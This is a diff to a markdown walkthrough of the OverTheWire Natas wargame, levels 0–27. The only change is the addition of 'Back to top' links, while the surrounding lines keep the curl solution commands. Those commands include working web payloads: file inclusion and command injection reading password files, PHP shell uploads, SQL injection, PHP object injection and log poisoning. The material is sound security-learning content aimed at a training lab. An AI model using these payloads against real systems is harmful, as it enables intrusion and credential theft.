@@ -60,6 +60,8 @@ The password for the next level is in the source code of the site.
 curl -s http://natas0:$natas0_pass@natas0.natas.labs.overthewire.org/ | egrep -o [[:alnum:]]{32}
 ```
 
+[*Back to top*](#overthewire---natas)
+
 ## Level 1
 
 ![natas1_index.jpg](screenshots/natas/natas1_index.jpg)
@@ -69,6 +71,8 @@ There is a script blocking right clicking on the site. However, you can still so
 ```bash
 curl -s http://natas1:$natas1_pass@natas1.natas.labs.overthewire.org/ | sed "s/$natas1_pass//g" | egrep -o [[:alnum:]]{32}
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 2
 
@@ -83,6 +87,8 @@ The source code reveals a directory named `files`. If we go to the [files](http:
 ```bash
 curl -s http://natas2:$natas2_pass@natas2.natas.labs.overthewire.org/files/users.txt | egrep -o [[:alnum:]]{32}
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 3
 
@@ -102,6 +108,8 @@ If we view the contents of [s3cr3t](http://natas3.natas.labs.overthewire.org/s3c
 curl -s http://natas3:$natas3_pass@natas3.natas.labs.overthewire.org/s3cr3t/users.txt | egrep -o [[:alnum:]]{32}
 ```
 
+[*Back to top*](#overthewire---natas)
+
 ## Level 4
 
 ![natas4_index.jpg](screenshots/natas/natas4_index.jpg)
@@ -111,6 +119,8 @@ When we connect to the site, we get a message saying only users from `http://nat
 ```bash
 curl -s http://natas4:$natas4_pass@natas4.natas.labs.overthewire.org/ -e http://natas5.natas.labs.overthewire.org/ | sed "s/$natas4_pass//g" | egrep -o [[:alnum:]]{32}
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 5
 
@@ -128,6 +138,8 @@ Let's try sending a request with a cookie set to `loggedin=1`. We can do this wi
 ```bash
 curl -s http://natas5:$natas5_pass@natas5.natas.labs.overthewire.org/ -b "loggedin=1" | sed "s/$natas5_pass//g" | egrep -o [[:alnum:]]{32}
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 6
 
@@ -172,6 +184,8 @@ We need to send a `POST` request with the parameters `secret` and `submit`. Now 
 curl -s "http://natas6:$natas6_pass@natas6.natas.labs.overthewire.org/" -X 'POST' -d "secret=$(curl -s http://natas6:$natas6_pass@natas6.natas.labs.overthewire.org/includes/secret.inc | grep -oP '\$secret = "\K[^"]+')&submit" | sed "s/$natas6_pass//g" | egrep -o [[:alnum:]]{32}
 ```
 
+[*Back to top*](#overthewire---natas)
+
 ## Level 7
 
 ![natas7_index.jpg](screenshots/natas/natas7_index.jpg)
@@ -185,6 +199,8 @@ It looks like it's loading the page through the `index.php` script using the `pa
 ```bash
 curl -s "http://natas7:$natas7_pass@natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" | sed "s/$natas7_pass//g" | egrep -o [[:alnum:]]{32}
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 8
 
@@ -217,6 +233,8 @@ Here we can see a variable, `encodedSecret`, and a function, `encodeSecret`, bei
 curl -s "http://natas8:$natas8_pass@natas8.natas.labs.overthewire.org/" -X 'POST' -d "secret=$(curl -s "http://natas8:$natas8_pass@natas8.natas.labs.overthewire.org/index-source.html" | grep -oP '\$encodedSecret&nbsp;=&nbsp;"\K[^"]+' | xxd -p -r | rev | base64 -d)&submit" | sed "s/$natas8_pass//g" | egrep -o [[:alnum:]]{32}
 ```
 
+[*Back to top*](#overthewire---natas)
+
 ## Level 9
 
 ![natas9_index.jpg](screenshots/natas/natas9_index.jpg)
@@ -242,6 +260,8 @@ This page uses the `passthru` command to send our input to the server using the 
 ```bash
 curl -s "http://natas9:$natas9_pass@natas9.natas.labs.overthewire.org/" --data-urlencode "needle=. /etc/natas_webpass/natas10;" | sed "s/$natas9_pass//g" | egrep -o [[:alnum:]]{32}
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 10
 
@@ -274,6 +294,8 @@ We *could* use `needle=. /etc/natas_webpass/natas11`, but `needle=-he "[[:alnum:
 ```bash
 curl -s "http://natas10:$natas10_pass@natas10.natas.labs.overthewire.org/" --data-urlencode 'needle=-he "[[:alnum:]]\{32\}" /etc/natas_webpass/natas11' | sed "s/$natas10_pass//g" | egrep -o [[:alnum:]]{32}
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 11
 
@@ -355,6 +377,8 @@ Now we just have to create a new array where `showpassword` is `yes` and encrypt
 ```bash
 curl -s "http://natas11:$natas11_pass@natas11.natas.labs.overthewire.org/" -b "data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK" | sed "s/$natas11_pass//g" | egrep -o [[:alnum:]]{32}
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 12
 
@@ -440,6 +464,8 @@ Then we get the results of the file we just uploaded:
 curl "http://natas12:$natas12_pass@natas12.natas.labs.overthewire.org/$(echo -n '<?php readfile("/etc/natas_webpass/natas13")?>' | curl -s "http://natas12:$natas12_pass@natas12.natas.labs.overthewire.org/" -X 'POST' -F "filename=natas12.php" -F "uploadedfile=@-;filename=natas12.php" | grep -oP 'href="\Kupload/[[:alnum:]]{10}.php')"
 ```
 
+[*Back to top*](#overthewire---natas)
+
 ## Level 13
 
 ![natas13_index.jpg](screenshots/natas/natas13_index.jpg)
@@ -521,6 +547,8 @@ Before the file can be uploaded, it needs to pass the [exif_imagetype](https://w
 curl -s "http://natas13:$natas13_pass@natas13.natas.labs.overthewire.org/$(echo -n 'BM<?php readfile("/etc/natas_webpass/natas14");?>' | curl -s "http://natas13:$natas13_pass@natas13.natas.labs.overthewire.org/" -X 'POST' -F "filename=natas13.php" -F "uploadedfile=@-;filename=natas13.php" | grep -oP 'href="\Kupload/[[:alnum:]]{10}.php')" | egrep -o [[:alnum:]]{32}$
 ```
 
+[*Back to top*](#overthewire---natas)
+
 ## Level 14
 
 ![natas14_index.jpg](screenshots/natas/natas14_index.jpg)
@@ -572,6 +600,8 @@ Now to send our SQLi:
 ```bash
 curl -s "http://natas14:$natas14_pass@natas14.natas.labs.overthewire.org/index.php" --data-urlencode 'username=" or 1=1#' | sed "s/$natas14_pass//g" | egrep -o [[:alnum:]]{32}
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 15
 
@@ -664,6 +694,8 @@ if __name__ == '__main__':
     print(password)
 ```
 
+[*Back to top*](#overthewire---natas)
+
 ## Level 16
 
 ![natas16_index.jpg](screenshots/natas/natas16_index.jpg)
@@ -743,6 +775,8 @@ if __name__ == '__main__':
     password = get_password(charset)
     print(password)
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 17
 
@@ -843,6 +877,8 @@ if __name__ == '__main__':
     password = get_password(charset, time)
     print(password)
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 18
 
@@ -999,6 +1035,8 @@ if __name__ == '__main__':
     print(find_password())
 ```
 
+[*Back to top*](#overthewire---natas)
+
 ## Level 19
 
 ![natas19_index.jpg](screenshots/natas/natas19_index.jpg)
@@ -1041,6 +1079,8 @@ def find_password():
 if __name__ == '__main__':
     print(find_password())
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 20
 
@@ -1263,6 +1303,8 @@ We will need to send two requests to get the password. The first to set the sess
 curl -s "http://natas20:$natas20_pass@natas20.natas.labs.overthewire.org/" -b PHPSESSID=$(curl -Is "http://natas20:$natas20_pass@natas20.natas.labs.overthewire.org/index.php?name=admin%0aadmin+1" | grep -oP 'PHPSESSID=\K[[:alnum:]-]+(?=;)') | sed "s/$natas20_pass//g" | egrep -o [[:alnum:]]{32}
 ```
 
+[*Back to top*](#overthewire---natas)
+
 ## Level 21
 
 ![natas21_index.jpg](screenshots/natas/natas21_index.jpg)
@@ -1351,6 +1393,8 @@ We can see that if `submit` is a parameter, it will just set every key/value pai
 curl -s "http://natas21:$natas21_pass@natas21.natas.labs.overthewire.org/" -b PHPSESSID=$(curl -Is "http://natas21:$natas21_pass@natas21-experimenter.natas.labs.overthewire.org/index.php?admin=1&submit" | grep -oP 'PHPSESSID=\K[[:alnum:]-]+(?=;)') | sed "s/$natas21_pass//g" | egrep -o [[:alnum:]]{32}
 ```
 
+[*Back to top*](#overthewire---natas)
+
 ## Level 22
 
 ![natas22_index.jpg](screenshots/natas/natas22_index.jpg)
@@ -1383,6 +1427,8 @@ This is an extremely easy challenge. It will reveal the password as long as we h
 ```bash
 curl -s "http://natas22:$natas22_pass@natas22.natas.labs.overthewire.org/index.php?revelio" | sed "s/$natas22_pass//g" | egrep -o [[:alnum:]]{32}
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 23
 
@@ -1430,6 +1476,8 @@ That's... cool. Apparently when php compares a string to integer, it will conver
 curl -s "http://natas23:$natas23_pass@natas23.natas.labs.overthewire.org/index.php?passwd=11iloveyou" | sed "s/$natas23_pass//g" | egrep -o [[:alnum:]]{32}
 ```
 
+[*Back to top*](#overthewire---natas)
+
 ## Level 24
 
 ![natas24_index.jpg](screenshots/natas/natas24_index.jpg)
@@ -1469,6 +1517,8 @@ Interesting... Apparently, if we compare any string to an array with `strcmp`, i
 ```bash
 curl -s "http://natas24:$natas24_pass@natas24.natas.labs.overthewire.org/index.php?passwd[]" | sed "s/$natas24_pass//g" | egrep -o [[:alnum:]]{32}
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 25
 
@@ -1628,6 +1678,8 @@ Since there doesn't seem to be any validation of the session id, we do all of th
 ```bash
 PHPSESSID=$(cat /dev/urandom | tr -cd [:alnum:] | head -c16); curl -s "http://natas25:$natas25_pass@natas25.natas.labs.overthewire.org/index.php" -b "PHPSESSID=$PHPSESSID" --data-urlencode "lang=/....//logs/natas25_$PHPSESSID.log" -A '<?php readfile("/etc/natas_webpass/natas26")?>' | sed "s/$natas25_pass//g" | egrep -o [[:alnum:]]{32}
 ```
+
+[*Back to top*](#overthewire---natas)
 
 ## Level 26
 
@@ -1827,6 +1879,8 @@ Now we pass that to the site and read the file:
 filename=$(cat /dev/urandom | tr -cd [:alnum:] | head -c16); curl -s "http://natas26:$natas26_pass@natas26.natas.labs.overthewire.org/" -b drawing=$(php -r 'class Logger{private $exitMsg="<?php readfile('"'/etc/natas_webpass/natas27'"')?>";private $logFile="img/'$filename'.php";}echo urlencode(base64_encode(serialize(new Logger())));') -o /dev/null; curl -s "http://natas26:$natas26_pass@natas26.natas.labs.overthewire.org/img/$filename.php"
 ```
 
+[*Back to top*](#overthewire---natas)
+
 ## Level 27
 
 ![natas27_index.jpg](screenshots/natas/natas27_index.jpg)
@@ -2012,3 +2066,5 @@ It worked! The extra character was truncated because it past the 64 character li
 ```bash
 curl -s "http://natas27:$natas27_pass@natas27.natas.labs.overthewire.org/" --data-urlencode "username=natas28                                                         ." -d "password=password" >/dev/null; curl -s "http://natas27:$natas27_pass@natas27.natas.labs.overthewire.org/index.php?username=natas28&password=password" | sed "s/$natas27_pass//g" | egrep -o [[:alnum:]]{32}
 ```
+
+[*Back to top*](#overthewire---natas)
